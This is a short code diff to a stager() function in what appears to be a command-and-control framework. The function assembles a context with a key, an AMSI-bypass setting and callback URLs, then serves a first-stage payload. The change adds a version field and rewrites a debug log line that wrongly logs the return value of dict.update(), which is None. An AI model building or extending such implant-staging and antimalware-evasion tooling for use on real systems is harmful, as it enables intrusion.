@@ -134,6 +134,7 @@ def stager():
         separator = ''
 
     stager_context = dict(
+        VERSION=__version__,
         key=key,
         amsibypass=amsi_bypass,
         callback=hidden_app.callback_urls[transport],
@@ -163,7 +164,8 @@ def stager():
     else:
         result = result.replace(separator, '')
 
-    log.debug("Delivering stage 1; context: %s" % stager_context)
+    log.debug("Delivering stage 1; context: %s" %
+              stager_context.update(stage2='...', stage3='...'))
 
     return Response(result, content_type='text/plain; charset=utf-8')
 
